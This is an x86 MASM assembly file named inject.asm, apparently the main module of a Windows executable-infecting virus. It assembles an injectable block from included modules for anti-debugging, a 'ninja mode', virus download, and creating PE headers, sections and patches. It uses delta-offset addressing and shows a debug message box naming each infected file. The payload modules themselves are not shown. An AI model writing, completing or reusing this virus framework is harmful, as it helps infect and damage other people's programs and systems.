; inject.asm
.386
.model flat, stdcall
assume fs:nothing

option casemap:none

include		\masm32\include\windows.inc
include		\masm32\include\user32.inc
include		\masm32\include\kernel32.inc
include		\masm32\include\msvcrt.inc

include		macro.asm

.code

toInject:

include		padding_patch.asm
include		private_data.asm
include		declare_independance.asm
include		ninja_mode.asm
include		anti_dbg.asm
include		dl_virus.asm
include		get_info_file.asm
include		create_header.asm
include		create_section.asm
include		create_patches.asm

; DEBUG FILE INJECTED
push	0
PDELTA	DebugDone
PDELTA	FileData.cFileName
push	0
call	[DELTA pMessageBox]

include		manage_exit.asm
include		utils.asm

endInject:

end		toInject
